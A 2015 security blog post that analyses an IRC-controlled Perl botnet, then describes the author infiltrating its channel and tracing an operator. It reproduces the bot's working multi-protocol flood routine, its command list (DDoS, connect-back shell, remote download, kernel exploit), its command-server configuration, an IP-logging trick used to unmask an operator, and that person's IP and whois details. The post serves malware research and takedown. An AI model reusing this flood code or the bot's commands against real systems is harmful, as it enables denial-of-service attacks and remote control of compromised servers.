---
layout: post
title:  "IRC driven Botnet"
subtitle: "Analysis and shutdown of a botnet ran by IRC protocol"
date:   2015-09-19 14:00:01
category: itsec
emoji: true
---

This is just a short post about an botnet I got mentioned. It is using a Perl script to infect and let the bot join an IRC server. Scriptkiddies kinda love that way, easy to deploy ircd and maintaining.

**++ UPDATE ++**
We cleaned the botnet up, if you want to skip to that part, click <a href="#shutdown">here</a>.

---

<blockquote class="twitter-tweet" lang="de"><p lang="en" dir="ltr">Look whose infecting servers? <a href="http://t.co/HGNWgjKU30">http://t.co/HGNWgjKU30</a> <a href="https://twitter.com/MalwareMustDie">@MalwareMustDie</a> IRC: 112.216.147.83:6667 <a href="https://twitter.com/hashtag/pma?src=hash">#pma</a> #.f <a href="http://t.co/XOAxIAMApS">http://t.co/XOAxIAMApS</a> <a href="https://twitter.com/hashtag/botnet?src=hash">#botnet</a></p>&mdash; White Packet (@WhitePacket) <a href="https://twitter.com/WhitePacket/status/645251900477042689">19. September 2015</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

It has some functions to DDoS and doing other crappy things scriptkiddies dream of in their wet nights:

        #eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki
        sub attacker {
          my $iaddr = inet_aton($_[0]);
          my $msg = 'B' x $_[1];
          my $ftime = $_[2];
          my $cp = 0;
          my (%pacotes);
          $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

          socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
          socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
          socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
          socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
          return(undef) if $cp == 4;
          my $itime = time;
          my ($cur_time);
          while ( 1 ) {
             for (my $porta = 1; $porta <= 65535; $porta++) {
               $cur_time = time - $itime;
               last if $cur_time >= $ftime;
               send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);
               send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);
               send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);
               send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);

               # DoS ?? :P
               for (my $pc = 3; $pc <= 255;$pc++) {
                 next if $pc == 6;
                 $cur_time = time - $itime;
                 last if $cur_time >= $ftime;
                 socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
                 send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);
               }
             }
             last if $cur_time >= $ftime;
          }
          return($cur_time, %pacotes);
        }

Commands:

        # Comandos:
        #           @oldpack <ip> <bytes> <tempo>;
        #           @udp <ip> <porta> <tempo>;
        #           @fullportscan <ip> <porta inicial> <porta final>;
        #           @conback <ip> <porta>
        #           @download <url> <arquivo a ser salvo>;
        #           !estatisticas <on/off>;
        #           !sair para finalizar o bot;
        #           !novonick para trocar o nick do bot por um novo aleatorio;
        #           !entra <canal> <tempo>
        #           !sai <canal> <tempo>;
        #           !pacotes <on/off>
        #           @info
        #           @xpl <kernel>
        #           @sendmail <assunto> <remetente> <destinatario> <conteudo>

Let's see the connection details:


        my @ps = ("/usr/local/apache/bin/httpd -DSSL","/sbin/syslogd","[eth0]","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron","[bash]");
        my $processo = $ps[rand scalar @ps];

        $servidor='112.216.147.83' unless $servidor;
        my $porta='6667';
        my @canais=("#.f");
        my @adms=("Vlad","Alex","x","Dragos","Culea");

        # Anti Flood ( 6/3 Recomendado )
        my $linas_max=10;
        my $sleep=5;

        my $nick = getnick();
        my $ircname = getident2();
        my $realname = "uname -sr";
        chop (my $realname = `uname -sr`);


The nick and username:

        sub getnick {
          return "MiKuTs".int(rand(1000));
        }

        sub getident2 {
                my $length=shift;
                $length = 3 if ($length < 3);

                my @chars=('a'..'z','A'..'Z','1'..'9');
                foreach (1..$length)
                {
                        $randomstring.=$chars[rand @chars];
                }
                return $randomstring;
        }

So I joined:

        21:37 !112.216.147.83 *** Looking up your hostname
        21:37 !112.216.147.83 *** Checking Ident
        21:37 !112.216.147.83 *** No ident response
        21:37 !112.216.147.83 *** Couldn't look up your hostname
        21:37 -!- Welcome to the Internet Relay Network MiKuTs1247
        21:37 -!- Your host is alex.and.vlad.ddos.server, running version beware1.5.7
        21:37 -!- This server was created Tue Jul 13 2004 at 20:36:17 GMT
        21:37 -!- alex.and.vlad.ddos.server beware1.5.7 dgikoswx biklmnoprstv
        21:37 -!- SILENCE=15 WHOX WALLCHOPS WALLVOICES USERIP CPRIVMSG CNOTICE MODES=6 MAXCHANNELS=100 MAXBANS=45 are supported by this server
        21:37 -!- NICKLEN=30 TOPICLEN=800 AWAYLEN=160 KICKLEN=800 CHANTYPES=#& PREFIX=(ov)@+ CHANMODES=b,k,l,rimnpst CASEMAPPING=rfc1459 are supported by this server
        21:37 -!- There are 173 users and 14 invisible on 1 servers
        21:37 -!- 1 unknown connection(s)
        21:37 -!- 3 operator(s) online
        21:37 -!- 6 channels formed
        21:37 -!- I have 187 clients and 0 servers
        21:37 !alex.and.vlad.ddos.server Highest connection count: 187 (187 clients)
        21:37 -!- - alex.and.vlad.ddos.server Message of the day
        21:37 -!- - 2015-9-8 2:05
        21:37 -!- - - #####                          __    _
        21:37 -!- - - #####                     _wr""        "-q__
        21:37 -!- - - #####                  _dP                 9m_
        21:37 -!- - - #####                _#P                     9#_
        21:37 -!- - - #####               d#@                       9#m
        21:37 -!- - - #####              d##                         ###
        21:37 -!- - - #####             J###                         ###L
        21:37 -!- - - #####             {###K                       J###K
        21:37 -!- - - #####             ]####K      ___aaa___      J####F
        21:37 -!- - - #####         __gmM######_  w#P""   ""9#m  _d#####Mmw__
        21:37 -!- - - #####      _g##############mZ_         __g##############m_
        21:37 -!- - - #####    _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_
        21:37 -!- - - #####   a###""          ,Z"#####@" '######"\g          ""M##m
        21:37 -!- - - #####  J#@"             0L  "*##     ##@"  J#              *#K
        21:37 -!- - - #####  #"               `#    "_gmwgm_~    dF               `#_
        21:37 -!- - - ##### 7F                 "#_   ]#####F   _dK                 JE
        21:37 -!- - - ##### ]                    *m__ ##### __g@"                   F
        21:37 -!- - - #####                        "PJ#####LP"
        21:37 -!- - - #####  `                       0######_                      '
        21:37 -!- - - #####                        _0########_
        21:37 -!- - - #####      .               _d#####^#####m__              ,
        21:37 -!- - - #####       "*w_________am#####P"   ~9#####mw_________w*"
        21:37 -!- - - #####           ""9@#####@M""           ""P@#####@M""
        21:37 -!- - -
        21:37 -!- - - -            o    Powered by ViRuS & #VooDoo   o
        21:37 -!- - - -           o      Listening on ports: 6667     o
        21:37 -!- - - -          o   DD0S Server pwned bY Alex & Vlad  o
        21:37 -!- - - -
        21:37 -!- - - -  -------- WARNING: THIS IS A PRIVATE SERVER, SO GET THE FUCK OUT! --------
        21:37 -!- - - -
        21:37 -!- - -
        21:37 -!- End of /MOTD command.
        21:37 !alex.and.vlad.ddos.server on 1 ca 1(4) ft 10(10)
        21:37 -!- Mode change [+x] for user MiKuTs1247
        21:37 -!- 8a0unH.dDgOPM.virtual is now your hidden host
        21:37 -!- Mode change [+i] for user MiKuTs1247

So this is by Alex and Vlad. IP's are kinda camouflaged by this server, using user mode +x as standard. Let's join the channel:

        21:37 -!- MiKuTs1247 [~QEl@8a0unH.dDgOPM.virtual] has joined #.f
        21:37 -!- Topic for #.f: <@x> inafara de ridicat bnc/muh/miau/drone  , <@Culea> laba
        21:37 -!- Topic set by x [] [Sat Sep 19 19:27:52 2015]
        21:37 [Users #.f]
        21:37 [@Alex     ] [ MiKuTs107 ] [ MiKuTs238] [ MiKuTs458] [ MiKuTs64 ] [ MiKuTs860]
        21:37 [@Culea    ] [ MiKuTs109 ] [ MiKuTs258] [ MiKuTs462] [ MiKuTs643] [ MiKuTs861]
        21:37 [@Doru     ] [ MiKuTs111 ] [ MiKuTs281] [ MiKuTs464] [ MiKuTs652] [ MiKuTs868]
        21:37 [@x        ] [ MiKuTs113 ] [ MiKuTs289] [ MiKuTs470] [ MiKuTs677] [ MiKuTs88 ]
        21:37 [+MiKuTs134] [ MiKuTs123 ] [ MiKuTs292] [ MiKuTs477] [ MiKuTs692] [ MiKuTs883]
        21:37 [+MiKuTs184] [ MiKuTs124 ] [ MiKuTs302] [ MiKuTs487] [ MiKuTs700] [ MiKuTs893]
        21:37 [+MiKuTs203] [ MiKuTs1247] [ MiKuTs303] [ MiKuTs514] [ MiKuTs701] [ MiKuTs91 ]
        21:37 [+MiKuTs319] [ MiKuTs125 ] [ MiKuTs309] [ MiKuTs530] [ MiKuTs711] [ MiKuTs910]
        21:37 [+MiKuTs33 ] [ MiKuTs132 ] [ MiKuTs315] [ MiKuTs531] [ MiKuTs716] [ MiKuTs912]
        21:37 [+MiKuTs363] [ MiKuTs140 ] [ MiKuTs335] [ MiKuTs542] [ MiKuTs73 ] [ MiKuTs917]
        21:37 [+MiKuTs508] [ MiKuTs151 ] [ MiKuTs342] [ MiKuTs544] [ MiKuTs732] [ MiKuTs920]
        21:37 [+MiKuTs520] [ MiKuTs17  ] [ MiKuTs344] [ MiKuTs555] [ MiKuTs744] [ MiKuTs927]
        21:37 [+MiKuTs624] [ MiKuTs175 ] [ MiKuTs347] [ MiKuTs564] [ MiKuTs745] [ MiKuTs934]
        21:37 [+MiKuTs641] [ MiKuTs178 ] [ MiKuTs367] [ MiKuTs571] [ MiKuTs748] [ MiKuTs941]
        21:37 [+MiKuTs645] [ MiKuTs205 ] [ MiKuTs382] [ MiKuTs572] [ MiKuTs756] [ MiKuTs96 ]
        21:37 [+MiKuTs695] [ MiKuTs206 ] [ MiKuTs387] [ MiKuTs575] [ MiKuTs78 ] [ MiKuTs960]
        21:37 [+MiKuTs727] [ MiKuTs21  ] [ MiKuTs400] [ MiKuTs576] [ MiKuTs788] [ MiKuTs961]
        21:37 [+MiKuTs742] [ MiKuTs212 ] [ MiKuTs408] [ MiKuTs586] [ MiKuTs792] [ MiKuTs967]
        21:37 [+MiKuTs782] [ MiKuTs214 ] [ MiKuTs417] [ MiKuTs607] [ MiKuTs796] [ MiKuTs978]
        21:37 [+MiKuTs795] [ MiKuTs229 ] [ MiKuTs438] [ MiKuTs633] [ MiKuTs812] [ snoopgirl]
        21:37 [+MiKuTs81 ] [ MiKuTs23  ] [ MiKuTs442] [ MiKuTs637] [ MiKuTs822]
        21:37 [+MiKuTs816] [ MiKuTs230 ] [ MiKuTs452] [ MiKuTs638] [ MiKuTs846]
        21:37 [+MiKuTs849] [ MiKuTs231 ] [ MiKuTs456] [ MiKuTs639] [ MiKuTs86 ]

It is also active:

        21:30 <@x> tu ridici pe 81 ?
        21:30 <@Culea> da
        21:30 -!- Irssi: Join to #.f was synced in 38 secs
        21:30 <@Culea> o venit
        21:30 <@Culea> :D
        21:30 -!- mode/#.f [+v MiKuTs2435] by x
        21:30 <@x> MiKuTs2435 id
        21:30 <@Culea> o dat domn
        21:30 <@Culea> :))
        21:30 <@Culea> da nu raspunde
        21:31 <@x> lag
        21:37 <@Culea> MiKuTs1247 id
        21:37 -!- mode/#.f [+v MiKuTs1247] by Culea
        21:37 <@Culea> MiKuTs1247 id
        21:37 <@Culea> hmm
        21:37 <@x> MiKuTs1247 id
        21:38 <@x> * +MiKuTs2435 (~QEl@4l5SNh.qagFb5.virtual) Quit (Quit: leaving)
        21:38 <@x> e acelasi
        21:38 <@x> :))
        21:38 <@Culea> ii trag muie

This is Romanian, so Romanian skiddos... I placed a link to trace IP addresses. One of them clicked it:

        94.103.205.82   Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0 09-19-2015, 03:32:19 pm

Gotcha! This is one of the botherdes.

        host205-82.customer.mediateknik.net.
        inetnum:        94.103.204.0 - 94.103.205.255
        netname:        MEDIATEKNIKVARBERG-NET01
        descr:          Mediateknik i Varberg AB
        country:        SE
        admin-c:        OH3439-RIPE
        tech-c:         OH3439-RIPE
        status:         ASSIGNED PA
        mnt-by:         MEDIATEKNIKVARBERG-MNT
        created:        2013-05-29T06:09:39Z
        last-modified:  2013-06-12T19:32:19Z
        source:         RIPE # Filtered
        mnt-routes:     IP-ONLY-MNT

        person:         Olle Hallnas
        address:        Allweb Sweden AB

Found also that:

![](https://i.imgur.com/VDT7FET.png)

![](https://i.imgur.com/crPyYjJ.png)

Another one:

        13:50 -!- Culea [~Adrian@pause.ro]
        13:50 -!-  ircname  : x
        13:50 -!-  server   : *.diesel.bounceme.net [diesel.bounceme.net]
        13:50 -!-           : IRC Operator
        13:50 -!- End of WHOIS

        % Top Level Domain : ro
        % Maintainance : www.rotld.ro
        Domain Name: pause.ro Registered On: 2007-09-26 Registrar: Hell Advertising SRL Referral URL: http://www.domain.ro
        Nameserver: ns.domain.ro
        Domain Status: OK

Full chat log:

        --- Log opened Sat Sep 19 21:29:34 2015
        21:29 -!- MiKuTs2435 [~QEl@4l5SNh.qagFb5.virtual] has joined #.f
        21:29 -!- Irssi: #.f: Total of 134 nicks [4 ops, 0 halfops, 18 voices, 112 normal]
        21:30 <@x> tu ridici pe 81 ?
        21:30 <@Culea> da
        21:30 -!- Irssi: Join to #.f was synced in 38 secs
        21:30 <@Culea> o venit
        21:30 <@Culea> :D
        21:30 -!- mode/#.f [+v MiKuTs2435] by x
        21:30 <@x> MiKuTs2435 id
        21:30 <@Culea> o dat domn
        21:30 <@Culea> :))
        21:30 <@Culea> da nu raspunde
        21:31 <@x> lag
        21:32 <+MiKuTs2435> http://tinyurl.com/[censored]
        --- Log closed Sat Sep 19 21:32:10 2015
        --- Log opened Sat Sep 19 21:37:29 2015
        21:37 -!- MiKuTs1247 [~QEl@8a0unH.dDgOPM.virtual] has joined #.f
        21:37 -!- Irssi: #.f: Total of 135 nicks [4 ops, 0 halfops, 19 voices, 112 normal]
        21:37 <@Culea> MiKuTs1247 id
        21:37 -!- mode/#.f [+v MiKuTs1247] by Culea
        21:37 <@Culea> MiKuTs1247 id
        21:37 <@Culea> hmm
        21:37 <@x> MiKuTs1247 id
        21:38 <@x> * +MiKuTs2435 (~QEl@4l5SNh.qagFb5.virtual) Quit (Quit: leaving)
        21:38 <@x> e acelasi
        21:38 <@x> :))
        21:38 <@Culea> ii trag muie
        21:38 -!- Irssi: Join to #.f was synced in 56 secs
        --- Log closed Sat Sep 19 21:38:28 2015


Malware must die!

![](https://i.imgur.com/cqXl2av.png)


Full user list:

        21:37 -!-        #.f MiKuTs1247 Hx  0  ~QEl@8a0unH.dDgOPM.virtual [Linux 3.2.0-4-amd64]
        21:37 -!-        #.f MiKuTs816 H+x 3  ~div@XsSt2O.cP7VqS.virtual [Linux 2.6.26-2-686]
        21:37 -!-        #.f MiKuTs33  H+x 3  ~d48@EnvRzP.TyGTmo.virtual [Linux 3.8.13-desktop-1.mga3]
        21:37 -!-        #.f MiKuTs289 Hx  3  ~1rk@00i0xb.leerCV.virtual [Linux 2.6.21.5-smp]
        21:37 -!-        #.f MiKuTs184 H+x 3  ~Lvy@I87ZAY.8msV8d.virtual [Linux 2.6.27]
        21:37 -!-        #.f MiKuTs695 H+x 3  ~M3B@bkPl70.XuR4NT.virtual [Linux 3.4.6-2.10-default]
        21:37 -!-        #.f MiKuTs645 H+x 3  ~dcj@e0VRxO.CMB0C0.virtual [Linux 2.6.32-431.el6.x86_64]
        21:37 -!-        #.f MiKuTs335 Hx  3  ~tfc@e6Qjb1.aL3GO0.virtual [Linux 4.1.6+]
        21:37 -!-        #.f MiKuTs727 H+x 3  ~X5h@tOZ8hd.TSF83c.virtual [Linux 3.5.2-3.fc17.x86_64]
        21:37 -!-        #.f MiKuTs319 H+x 3  ~Ews@DAqlD6.uSI2UZ.virtual [Linux 3.0.13-0.27-default]
        21:37 -!-        #.f MiKuTs639 Hx  3  ~Fnv@1LdoIJ.aA6mIH.virtual [Linux 2.6.18-194.el5]
        21:37 -!-        #.f MiKuTs978 Hx  3  ~ovj@Xf1vet.nxhyhZ.virtual [Darwin 10.8.0]
        21:37 -!-        #.f MiKuTs641 H+x 3  ~yju@0YKXMC.dRoQwL.virtual [Darwin 8.11.0]
        21:37 -!-        #.f MiKuTs81  H+x 3  ~1gi@OCIRy7.hCVU47.virtual [Linux 2.6.32-042stab088.4]
        21:37 -!-        #.f MiKuTs849 H+x 3  ~54e@pNVbB0.03AxZB.virtual [Linux 2.6.34.7-66.fc13.i686.PAE]
        21:37 -!-        #.f MiKuTs742 H+x 3  ~nsh@5tLCT6.0SG9kw.virtual [Linux 2.6.16.60-0.21-default]
        21:37 -!-        #.f MiKuTs520 H+x 3  ~7jc@HXNDcK.P1YdkF.virtual [Linux 3.2.64.stk32]
        21:37 -!-        #.f MiKuTs203 H+x 3  ~LJt@Ri4mq5.tRjK00.virtual [Linux 2.6.31.12-0.2-desktop]
        21:37 -!-        #.f MiKuTs134 H+x 3  ~byw@NvaXSQ.Ogxl2U.virtual [Linux 2.6.27-ovz-smp-alt9]
        21:37 -!-        #.f MiKuTs530 Hx  3  ~icv@U9z60q.OUNIuf.virtual [Linux 2.6.32-358.el6.x86_64]
        21:37 -!-        #.f Culea     H*@x 3  ~Adrian@pula.mea.ro [x]
        21:37 -!-        #.f MiKuTs624 H+x 3  ~emx@WfEpRe.m38tS7.virtual [Linux 2.6.19.3.starqos-486]
        21:37 -!-        #.f MiKuTs795 H+x 3  ~fp9@bBHGlu.iw8NHn.virtual [Linux 2.6.19.3.starqos-486]
        21:37 -!-        #.f MiKuTs363 H+x 3  ~abo@qn70sl.PltS3I.virtual [Linux 2.6.30.8-3-amd64-clst]
        21:37 -!-        #.f MiKuTs782 H+x 3  ~5lv@NpdJtY.vXPUni.virtual [Linux 2.6.32-279.el6.x86_64]
        21:37 -!-        #.f MiKuTs302 Hx  3  ~SGm@Pfrd0b.mM0ViO.virtual [Linux 3.8.13-68.3.2.el7uek.x86_64]
        21:37 -!-        #.f MiKuTs912 Hx  3  ~ajb@gaqlCs.LMrjfh.virtual [Linux 3.2.0-4-amd64]
        21:37 -!-        #.f MiKuTs645 H+x 3  ~dcj@e0VRxO.CMB0C0.virtual [Linux 2.6.32-431.el6.x86_64]
        21:37 -!-        #.f MiKuTs335 Hx  3  ~tfc@e6Qjb1.aL3GO0.virtual [Linux 4.1.6+]
        21:37 -!-        #.f MiKuTs727 H+x 3  ~X5h@tOZ8hd.TSF83c.virtual [Linux 3.5.2-3.fc17.x86_64]
        21:37 -!-        #.f MiKuTs319 H+x 3  ~Ews@DAqlD6.uSI2UZ.virtual [Linux 3.0.13-0.27-default]
        21:37 -!-        #.f MiKuTs639 Hx  3  ~Fnv@1LdoIJ.aA6mIH.virtual [Linux 2.6.18-194.el5]
        21:37 -!-        #.f MiKuTs978 Hx  3  ~ovj@Xf1vet.nxhyhZ.virtual [Darwin 10.8.0]
        21:37 -!-        #.f MiKuTs641 H+x 3  ~yju@0YKXMC.dRoQwL.virtual [Darwin 8.11.0]
        21:37 -!-        #.f MiKuTs81  H+x 3  ~1gi@OCIRy7.hCVU47.virtual [Linux 2.6.32-042stab088.4]
        21:37 -!-        #.f MiKuTs849 H+x 3  ~54e@pNVbB0.03AxZB.virtual [Linux 2.6.34.7-66.fc13.i686.PAE]
        21:37 -!-        #.f MiKuTs742 H+x 3  ~nsh@5tLCT6.0SG9kw.virtual [Linux 2.6.16.60-0.21-default]
        21:37 -!-        #.f MiKuTs520 H+x 3  ~7jc@HXNDcK.P1YdkF.virtual [Linux 3.2.64.stk32]
        21:37 -!-        #.f MiKuTs203 H+x 3  ~LJt@Ri4mq5.tRjK00.virtual [Linux 2.6.31.12-0.2-desktop]
        21:37 -!-        #.f MiKuTs134 H+x 3  ~byw@NvaXSQ.Ogxl2U.virtual [Linux 2.6.27-ovz-smp-alt9]
        21:37 -!-        #.f MiKuTs530 Hx  3  ~icv@U9z60q.OUNIuf.virtual [Linux 2.6.32-358.el6.x86_64]
        21:37 -!-        #.f Culea     H*@x 3  ~Adrian@pula.mea.ro [x]
        21:37 -!-        #.f MiKuTs624 H+x 3  ~emx@WfEpRe.m38tS7.virtual [Linux 2.6.19.3.starqos-486]
        21:37 -!-        #.f MiKuTs795 H+x 3  ~fp9@bBHGlu.iw8NHn.virtual [Linux 2.6.19.3.starqos-486]
        21:37 -!-        #.f MiKuTs363 H+x 3  ~abo@qn70sl.PltS3I.virtual [Linux 2.6.30.8-3-amd64-clst]
        21:37 -!-        #.f MiKuTs782 H+x 3  ~5lv@NpdJtY.vXPUni.virtual [Linux 2.6.32-279.el6.x86_64]
        21:37 -!-        #.f MiKuTs302 Hx  3  ~SGm@Pfrd0b.mM0ViO.virtual [Linux 3.8.13-68.3.2.el7uek.x86_64]
        21:37 -!-        #.f MiKuTs912 Hx  3  ~ajb@gaqlCs.LMrjfh.virtual [Linux 3.2.0-4-amd64]
        21:37 -!-        #.f MiKuTs231 Hx  3  ~Glh@ANZX5e.IXr4lK.virtual [Linux 3.13.0-61-generic]
        21:37 -!-        #.f MiKuTs417 Hx  3  ~eje@XisR7U.Bf9na8.virtual [Linux 3.16-2-amd64]
        21:37 -!-        #.f MiKuTs910 Hx  3  ~lwl@0kNane.TrM6Wi.virtual [Linux 2.6.18-371.11.1.el5]
        21:37 -!-        #.f MiKuTs917 Hx  3  ~Jsn@iZW7mG.kMJoRg.virtual [Linux 3.13.0-55-generic]
        21:37 -!-        #.f MiKuTs934 Hx  3  ~NbQ@8IJSjs.W23SRl.virtual [Linux 2.6.32-19-pve]
        21:37 -!-        #.f MiKuTs861 Hx  3  ~UNY@mxU0iQ.k8H2zl.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs822 Hx  3  ~2hi@4AQZXS.RIetjN.virtual [Linux 2.6.18-404.el5]
        21:37 -!-        #.f MiKuTs347 Hx  3  ~Muw@EPwALK.LWOK3Z.virtual [Linux 2.6.18-308.24.1.el5]
        21:37 -!-        #.f MiKuTs701 Hx  3  ~ktz@08gw5r.FZolhf.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs124 Hx  3  ~djg@D9gb3P.TBfXa1.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs175 Hx  3  ~UpO@MiXByh.SPbnLo.virtual [Linux 3.11.0-26-generic]
        21:37 -!-        #.f MiKuTs387 Hx  3  ~izv@f0Wstf.rfmsls.virtual [Linux 3.2.34-30]
        21:37 -!-        #.f MiKuTs960 Hx  3  ~krw@f23J3d.28303b.virtual [Linux 2.6.32-504.23.4.el6.x86_64]
        21:37 -!-        #.f MiKuTs796 Hx  3  ~mfr@qVwGB0.0OVbkV.virtual [Linux 2.6.32-504.23.4.el6.x86_64]
        21:37 -!-        #.f MiKuTs788 Hx  3  ~pxi@wRM9hm.dokWc7.virtual [Linux 2.6.32-042stab094.8]
        21:37 -!-        #.f MiKuTs652 Hx  3  ~45z@GqlJV1.S5hGmE.virtual [Linux 3.2.0-4-amd64]
        21:37 -!-        #.f MiKuTs792 Hx  3  ~EDg@1vKN7b.5gXTZK.virtual [Linux 2.6.32-504.el6.x86_64]
        21:37 -!-        #.f MiKuTs464 Hx  3  ~B2n@Azd0Hv.o5j01C.virtual [Linux 3.10.0-229.el7.x86_64]
        21:37 -!-        #.f MiKuTs748 Hx  3  ~vcp@oyqwcd.TsnBH8.virtual [Linux 2.6.32-504.23.4.el6.x86_64]
        21:37 -!-        #.f MiKuTs91  Hx  3  ~nv1@PcjxhQ.cAJBfc.virtual [Linux 3.10.23-xxxx-std-ipv6-64]
        21:37 -!-        #.f MiKuTs125 Hx  3  ~FUI@e9rkIy.xYv109.virtual [Linux 2.6.32-504.23.4.el6.x86_64]
        21:37 -!-        #.f MiKuTs231 Hx  3  ~Glh@ANZX5e.IXr4lK.virtual [Linux 3.13.0-61-generic]
        21:37 -!-        #.f MiKuTs417 Hx  3  ~eje@XisR7U.Bf9na8.virtual [Linux 3.16-2-amd64]
        21:37 -!-        #.f MiKuTs910 Hx  3  ~lwl@0kNane.TrM6Wi.virtual [Linux 2.6.18-371.11.1.el5]
        21:37 -!-        #.f MiKuTs917 Hx  3  ~Jsn@iZW7mG.kMJoRg.virtual [Linux 3.13.0-55-generic]
        21:37 -!-        #.f MiKuTs934 Hx  3  ~NbQ@8IJSjs.W23SRl.virtual [Linux 2.6.32-19-pve]
        21:37 -!-        #.f MiKuTs861 Hx  3  ~UNY@mxU0iQ.k8H2zl.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs822 Hx  3  ~2hi@4AQZXS.RIetjN.virtual [Linux 2.6.18-404.el5]
        21:37 -!-        #.f MiKuTs347 Hx  3  ~Muw@EPwALK.LWOK3Z.virtual [Linux 2.6.18-308.24.1.el5]
        21:37 -!-        #.f MiKuTs701 Hx  3  ~ktz@08gw5r.FZolhf.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs124 Hx  3  ~djg@D9gb3P.TBfXa1.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs175 Hx  3  ~UpO@MiXByh.SPbnLo.virtual [Linux 3.11.0-26-generic]
        21:37 -!-        #.f MiKuTs387 Hx  3  ~izv@f0Wstf.rfmsls.virtual [Linux 3.2.34-30]
        21:37 -!-        #.f MiKuTs960 Hx  3  ~krw@f23J3d.28303b.virtual [Linux 2.6.32-504.23.4.el6.x86_64]
        21:37 -!-        #.f MiKuTs796 Hx  3  ~mfr@qVwGB0.0OVbkV.virtual [Linux 2.6.32-504.23.4.el6.x86_64]
        21:37 -!-        #.f MiKuTs788 Hx  3  ~pxi@wRM9hm.dokWc7.virtual [Linux 2.6.32-042stab094.8]
        21:37 -!-        #.f MiKuTs652 Hx  3  ~45z@GqlJV1.S5hGmE.virtual [Linux 3.2.0-4-amd64]
        21:37 -!-        #.f MiKuTs792 Hx  3  ~EDg@1vKN7b.5gXTZK.virtual [Linux 2.6.32-504.el6.x86_64]
        21:37 -!-        #.f MiKuTs464 Hx  3  ~B2n@Azd0Hv.o5j01C.virtual [Linux 3.10.0-229.el7.x86_64]
        21:37 -!-        #.f MiKuTs748 Hx  3  ~vcp@oyqwcd.TsnBH8.virtual [Linux 2.6.32-504.23.4.el6.x86_64]
        21:37 -!-        #.f MiKuTs91  Hx  3  ~nv1@PcjxhQ.cAJBfc.virtual [Linux 3.10.23-xxxx-std-ipv6-64]
        21:37 -!-        #.f MiKuTs125 Hx  3  ~FUI@e9rkIy.xYv109.virtual [Linux 2.6.32-504.23.4.el6.x86_64]
        21:37 -!-        #.f MiKuTs458 Hx  3  ~vub@SfJ7KI.io0NdQ.virtual [Linux 2.6.32-573.3.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs206 Hx  3  ~Qcz@B30czG.EwV0Ud.virtual [Linux 2.6.32-573.3.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs564 Hx  3  ~xhc@h1nJPs.pLW601.virtual [Linux 3.13.0-32-generic]
        21:37 -!-        #.f MiKuTs812 Hx  3  ~AjB@p65KXf.G9EHlX.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs575 Hx  3  ~5re@olldVD.Dw0hv5.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs132 Hx  3  ~65h@b5776b.GtwGPu.virtual [Linux 3.10.0-229.el7.x86_64]
        21:37 -!-        #.f MiKuTs78  Hx  3  ~9er@U3lcZj.PpKulx.virtual [Linux 3.10.0-229.1.2.el7.x86_64]
        21:37 -!-        #.f MiKuTs508 H+x 3  ~9zq@WJR6SJ.6iAfcE.virtual [Linux 2.6.26-2-686]
        21:37 -!-        #.f MiKuTs477 Hx  3  ~9nc@0M1fCT.H90Rr0.virtual [Linux 2.6.22.9]
        21:37 -!-        #.f Alex      H*@x 3  ~alex@alex.ro [*]
        21:37 -!-        #.f MiKuTs292 Hx  3  ~cvs@zbL225.STH2vu.virtual [Linux 2.6.9-67.ELsmp]
        21:37 -!-        #.f Doru      H@x 3  ~PruncuTz@H29JyI.lifwdL.virtual [...]
        21:37 -!-        #.f MiKuTs868 Hx  3  ~I77@KqcNNY.YY8mGj.virtual [Linux 2.2.14-6.1.1smp]
        21:37 -!-        #.f MiKuTs107 Hx  3  ~l6o@GWgPiu.Iy1EZV.virtual [Linux 2.6.22.9]
        21:37 -!-        #.f snoopgirl Hx  3  ~bluebus@qexb3B.cnOw0q.virtual [devasto]
        21:37 -!-        #.f x         H*@x 3  ~old@xxx [old]
        21:37 -!-        #.f MiKuTs633 Hx  3  ~Lyu@22svja.bv5eod.virtual [Linux 2.6.9-100.ELsmp]
        21:37 -!-        #.f MiKuTs716 Hx  3  ~n4e@zZ5bER.aYUB9r.virtual [Linux 2.6.18-348.3.1.el5]
        21:37 -!-        #.f MiKuTs470 Hx  3  ~idp@DoMN7U.CH7CcK.virtual [Linux 2.6.32-042stab105.14]
        21:37 -!-        #.f MiKuTs342 Hx  3  ~ism@ATFpXt.VYx1zy.virtual [Linux 2.6.31.14-0.8-default]
        21:37 -!-        #.f MiKuTs344 Hx  3  ~grw@KKMDj4.KDuUKl.virtual [Linux 2.6.32-431.el6.i686]
